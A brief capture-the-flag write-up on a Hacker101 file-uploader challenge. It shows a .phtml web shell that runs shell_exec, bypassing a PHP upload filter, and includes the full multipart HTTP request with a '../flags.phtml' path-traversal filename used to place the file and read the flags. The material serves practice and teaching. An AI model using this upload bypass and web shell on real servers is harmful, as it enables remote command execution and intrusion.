# Hacker 101 CTF Y2FuIHlvdSByZWNvbj8/

3 Flags

File uploader

After uploading an image file I attempted the typical php upload which was rejected.

A common bypass for upload exploitation is to use the php html parsing technique by uploading a .phtml file.

```phtml
<?php
    $astro = shell_exec('ls .. a');
    echo $astro;
?>
```

```http
POST / HTTP/2
Host: 509c4bacb706f6647b9e57bc8b7e22bb.ctf.hacker101.com
Content-Length: 373
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://509c4bacb706f6647b9e57bc8b7e22bb.ctf.hacker101.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryASJAHX70lbuwhNS8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://509c4bacb706f6647b9e57bc8b7e22bb.ctf.hacker101.com/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryASJAHX70lbuwhNS8
Content-Disposition: form-data; name="filename"

../flags.phtml
------WebKitFormBoundaryASJAHX70lbuwhNS8
Content-Disposition: form-data; name="upload"; filename="astro.phtml"
Content-Type: application/octet-stream

<?php
    $astro = shell_exec('ls .. a');
    echo $astro;
?>
------WebKitFormBoundaryASJAHX70lbuwhNS8--
```

After much frustration I was curious about the multiple Content-Disposition headers.

This led me to add a directory check following the first webkit boundary.

I then went to my browser and added the /flags.phtml to the URL.

This then returned all three flags. Short but sweet.
